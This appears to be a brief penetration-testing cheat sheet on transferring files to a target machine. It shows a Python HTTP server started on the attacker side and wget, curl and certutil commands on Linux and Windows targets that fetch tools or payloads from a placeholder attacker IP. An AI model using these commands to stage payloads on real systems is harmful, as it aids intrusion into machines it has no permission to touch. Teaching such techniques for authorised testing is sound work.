If you need to transfer a file from one machine to another during a penetration test, one of the simplest methods is using an HTTP server. Python provides a built-in HTTP server that allows quick file sharing without additional configuration.

This method is commonly used to download tools, scripts, or payloads when direct file transfer options are limited.

---

### Linux

```bash
# machine 1 (attacker / server)
python3 -m http.server 80
```

This command starts a simple HTTP server in the current directory, making all files accessible over HTTP.

```bash
# machine 2 (target)
wget http://<attacker-ip>:<port>/<file>
```

```bash
# or
curl http://<attacker-ip>:<port>/<file> -o <output-file>
```

`wget` and `curl` are commonly available on Linux systems and allow files to be downloaded directly from the HTTP server.

---

### Windows

```bash
# Linux machine (server)
python3 -m http.server 80
```

```bash
# Windows machine (target)
certutil -urlcache -f http://<attacker-ip>:<port>/<file> <new_file_name>
```

`certutil` is a native Windows utility that can download files over HTTP, making it useful when other download tools are not available.
